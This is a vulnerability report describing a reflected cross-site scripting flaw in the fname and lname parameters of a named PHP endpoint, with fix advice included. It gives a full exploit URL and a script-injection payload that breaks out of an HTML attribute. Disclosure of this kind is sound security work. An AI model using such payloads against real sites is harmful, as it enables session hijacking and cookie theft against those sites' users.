## Title
Reflected Cross-Site Scripting (XSS) in `fname` and `lname` Parameters

## Summary
I identified a reflected Cross-Site Scripting (XSS) vulnerability in the `fname` and `lname` parameters of the following endpoint:

## Vulnerable Endpoint
`https://kzlabs.com/punishment/1.php`

## Steps to Reproduce
1. Open the following URL in a browser:
`https://kzlabs.com/punishment/1.php?fname=rajvardhan1%22%3E%3CScRipt%3Ealert%280%29%3C%2FScRipt%3E&lname=rajvardhan1%22%3E%3CScRipt%3Ealert%28100%29%3C%2FScRipt%3E`

2. Observe JavaScript execution in browser.

## Payload Used
`rajvardhan1"><ScRipt>alert(0)</ScRipt>`

## Proof of Concept

## Screenshot — Vulnerable application confirming XSS execution
<img width="1916" height="1008" alt="image" src="https://github.com/user-attachments/assets/46e363fa-d144-480c-bb8c-8fa176c93162" />




## Impact
- Cookie theft
- Session hijacking
- Phishing attacks
- JavaScript execution in victim browser

## Recommendations for Fix
- Use context-aware output encoding
- Apply `htmlspecialchars()` in PHP
- Avoid rendering raw user input
